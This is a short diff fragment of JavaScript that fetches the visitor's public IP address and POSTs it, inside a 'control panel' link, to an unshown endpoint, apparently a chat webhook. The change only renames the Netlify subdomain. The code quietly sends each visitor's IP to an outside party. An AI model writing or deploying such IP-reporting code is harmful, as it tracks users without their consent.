@@ -11,7 +11,7 @@ fetch('https://api.ipify.org?format=json')
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ 
-        content: "control panel: https://hrkdbbrjuoeu.netlify.app/?ip=" + encodeURIComponent(userIP)
+        content: "control panel: https://evoworld-io-control-panel.netlify.app/?ip=" + encodeURIComponent(userIP)
       })
     })
     .then(res => {
